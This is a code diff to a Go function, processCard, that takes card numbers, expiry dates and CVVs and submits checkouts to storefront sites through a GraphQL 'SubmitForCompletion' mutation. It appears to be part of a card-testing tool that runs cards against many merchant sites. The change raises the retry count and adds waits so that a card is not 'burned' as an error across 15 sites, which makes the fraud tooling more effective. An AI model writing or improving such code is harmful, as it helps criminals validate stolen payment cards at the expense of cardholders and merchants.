@@ -1675,7 +1675,7 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 
 	submitType := fstr(body, "__typename")
 
-	for _rejTry := 0; _rejTry < 2 && submitType == "SubmitRejected"; _rejTry++ {
+	for _rejTry := 0; _rejTry < 6 && submitType == "SubmitRejected"; _rejTry++ {
 		errCodes := []string{}
 		errs := fastExtract(body, "errors")
 		if errs != nil {
@@ -1752,6 +1752,20 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 				"proposedTotalAmount": map[string]interface{}{"value": map[string]string{"amount": taxAmount, "currencyCode": currency}},
 			}
 			submitVars["attemptToken"] = submitAttemptToken
+			// Pending terms compute async — give the backend time to settle
+			// before resubmitting, otherwise every retry returns the same
+			// intermediate state and the card burns all 15 sites as ERROR.
+			_waitMs := 1000
+			for _, _c := range errCodes {
+				if _c == "WAITING_PENDING_TERMS" {
+					_waitMs = 3000
+					break
+				}
+			}
+			select {
+			case <-ctx.Done():
+			case <-time.After(time.Duration(_waitMs) * time.Millisecond):
+			}
 			submitPayload, _ = json.Marshal(map[string]interface{}{"query": MUTATION_SUBMIT, "variables": submitVars, "operationName": "SubmitForCompletion"})
 			body, _, retryErr := doReq(ctx, client, "POST", graphqlURL+"?operationName=SubmitForCompletion", headers, bytes.NewReader(submitPayload))
 			if retryErr != nil {
